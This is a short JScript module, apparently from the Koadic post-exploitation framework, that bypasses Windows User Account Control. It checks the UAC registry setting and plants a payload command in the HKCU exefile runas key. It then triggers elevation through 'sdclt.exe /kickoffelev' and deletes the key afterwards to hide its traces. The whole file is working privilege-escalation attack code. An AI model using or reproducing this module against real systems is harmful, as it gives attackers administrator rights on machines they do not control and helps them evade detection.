try
{
    var readpath = "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System";
    var key = "ConsentPromptBehaviorAdmin";
    var out = Koadic.registry.read(Koadic.registry.HKLM, readpath, key, Koadic.registry.DWORD);

    if (out.uValue == 2)
        throw new Error("UAC is set to highest");

    var path = "Software\\Classes\\exefile\\shell\\runas\\command";

    var cmd = Koadic.file.getPath("%COMSPEC%");
    Koadic.registry.write(Koadic.registry.HKCU, path, "IsolatedCommand", cmd + " /c ~PAYLOAD_DATA~", Koadic.registry.STRING);

    Koadic.shell.run("sdclt.exe /kickoffelev", true);

    Koadic.work.report("Completed");

    var now = new Date().getTime();
    while (new Date().getTime() < now + 10000);

    Koadic.registry.destroy(Koadic.registry.HKCU, path, "IsolatedCommand");
}
catch (e)
{
    Koadic.work.error(e);
}

Koadic.exit();
